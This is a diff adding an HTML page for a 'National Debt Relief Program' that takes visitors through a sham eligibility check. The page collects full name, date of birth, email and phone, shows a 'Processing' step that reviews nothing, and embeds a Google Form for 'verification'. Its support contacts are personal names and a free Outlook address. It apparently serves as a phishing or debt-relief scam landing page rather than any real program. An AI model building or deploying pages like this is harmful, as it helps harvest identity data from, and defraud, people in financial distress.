@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>National Debt Relief Program</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f4f6f8;
+      color: #333;
+    }
+
+    header {
+      background: #0b3c5d;
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .logo {
+      font-size: 28px;
+      font-weight: bold;
+    }
+
+    .sub {
+      font-size: 14px;
+      opacity: 0.9;
+    }
+
+    .container {
+      max-width: 900px;
+      margin: auto;
+      padding: 30px 20px;
+    }
+
+    .box {
+      background: #fff;
+      padding: 25px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+      margin-bottom: 20px;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0 15px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      background: #0b3c5d;
+      color: #fff;
+      padding: 12px 25px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    button:hover {
+      background: #092f47;
+    }
+
+    .back-btn {
+      background: #777;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    footer {
+      background: #222;
+      color: #fff;
+      text-align: center;
+      padding: 15px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+
+<body>
+
+<header>
+  <div class="logo">National Debt Relief Program</div>
+  <div class="sub">Debt Relief Support & Eligibility Assessment</div>
+</header>
+
+<div class="container">
+
+  <!-- PAGE 1 -->
+  <div id="page1" class="box">
+    <h2>Welcome</h2>
+    <p>Please follow the steps below to check your eligibility for debt relief assistance.</p>
+    <button onclick="showPage(2)">Check Eligibility</button>
+  </div>
+
+  <!-- PAGE 2 -->
+  <div id="page2" class="box hidden">
+    <h2>Eligibility Check</h2>
+    <input id="name2" type="text" placeholder="Full Name" required>
+    <input id="dob2" type="date" required>
+    <input id="email2" type="email" placeholder="Email Address (optional)">
+    <input id="phone2" type="tel" placeholder="Phone Number (optional)">
+    <button onclick="validateContact()">Submit & Continue</button>
+    <button class="back-btn" onclick="showPage(1)">← Back</button>
+  </div>
+
+  <!-- PAGE 3 -->
+  <div id="page3" class="box hidden">
+    <h2>Processing</h2>
+    <p>Please wait while we review your information.</p>
+    <button onclick="showPage(4)">Continue</button>
+    <button class="back-btn" onclick="showPage(2)">← Back</button>
+  </div>
+
+  <!-- PAGE 4 -->
+  <div id="page4" class="box hidden">
+    <h2>Result</h2>
+    <p>You may proceed to verification.</p>
+    <button onclick="showPage(5)">Start Verification</button>
+    <button class="back-btn" onclick="showPage(3)">← Back</button>
+  </div>
+
+  <!-- PAGE 5 (GOOGLE FORM EMBED) -->
+  <div id="page5" class="box hidden">
+    <h2>Verification & Eligibility Form</h2>
+    <p>Please complete the form below:</p>
+
+    <iframe
+      src="https://docs.google.com/forms/d/e/1FAIpQLSfTfIk81JFANF6xHdUGpwywDyvApM8qwCLDUMQPH6EhpbQGIw/viewform?embedded=true&hl=en"
+      width="100%"
+      height="900"
+      frameborder="0"
+      marginheight="0"
+      marginwidth="0">
+      Loading…
+    </iframe>
+
+    <button class="back-btn" onclick="showPage(4)">← Back</button>
+  </div>
+
+  <!-- PAGE 6 -->
+  <div id="page6" class="box hidden">
+    <h2>Submission Successful</h2>
+    <p>Your information has been submitted.</p>
+    <button onclick="showPage(7)">Contact Support</button>
+  </div>
+
+  <!-- PAGE 7 -->
+  <div id="page7" class="box hidden">
+    <h2>Contact Support</h2>
+    <ul>
+      <li>Vincent James</li>
+      <li>Zaccheus Spence</li>
+      <li>Michelle Jones</li>
+    </ul>
+    <p>Phone: +1 929 483 3594</p>
+    <p>Email: debtrelieve@outlook.com</p>
+  </div>
+
+</div>
+
+<footer>
+  <p>© 2026 National Debt Relief Program. All rights reserved.</p>
+</footer>
+
+<script>
+  function showPage(page) {
+    [1,2,3,4,5,6,7].forEach(p => {
+      document.getElementById("page" + p).classList.add("hidden");
+    });
+    document.getElementById("page" + page).classList.remove("hidden");
+  }
+
+  function validateContact() {
+    const name = document.getElementById("name2").value.trim();
+    const dob = document.getElementById("dob2").value.trim();
+    const email = document.getElementById("email2").value.trim();
+    const phone = document.getElementById("phone2").value.trim();
+
+    if (!name || !dob || (!email && !phone)) {
+      alert("Please fill name, DOB, and at least one contact method.");
+      return;
+    }
+    showPage(3);
+  }
+</script>
+
+</body>
+</html>
